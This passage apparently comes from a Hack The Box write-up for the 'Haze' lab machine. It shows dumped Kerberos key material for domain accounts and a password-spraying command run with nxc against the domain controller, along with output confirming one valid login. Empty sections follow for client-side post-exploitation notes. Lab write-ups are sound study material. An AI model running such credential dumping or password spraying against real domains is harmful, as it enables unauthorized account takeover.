haze.htb\mark.adams:aes128-cts-hmac-sha1-96:3502344879f9f943fb2fc2220f1dd291
haze.htb\mark.adams:des-cbc-md5:76ead3e35752c249
haze.htb\edward.martin:aes256-cts-hmac-sha1-96:48029aab89b7967d7c43ba40d75e43bbe67c553b9c5c09c75456e8870a24e1c2
haze.htb\edward.martin:aes128-cts-hmac-sha1-96:a9e80551f7a12fee506cb5450f4b5500
haze.htb\edward.martin:des-cbc-md5:7602a44c68d0cbf8
haze.htb\alexander.green:aes256-cts-hmac-sha1-96:06578d0ec5ddb41ab7bbdb37c7386720a2733a9f3710dacded236ea3df279c22
haze.htb\alexander.green:aes128-cts-hmac-sha1-96:e43abe81166deb809f9e27cc16b4eb99
haze.htb\alexander.green:des-cbc-md5:68866b461613ad91
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95
Haze-IT-Backup$:des-cbc-md5:3d026ee5e5914f8c
[*] Cleaning up...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat ldeep/_users_enabled.lst | grep -vf <(cat hashes.lst creds.lst| awk -F: '{print $1}') > users_tospray.lst && nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u users_tospray.lst -p 'Al3xand3r-Purple!'
LDAP        DC01.haze.htb   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)
LDAP        DC01.haze.htb   389    DC01             [+] haze.htb\alexander.green:Al3xand3r-Purple!
LDAP        DC01.haze.htb   389    DC01             [-] haze.htb\Administrator:Al3xand3r-Purple! KDC_ERR_PREAUTH_FAILED
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```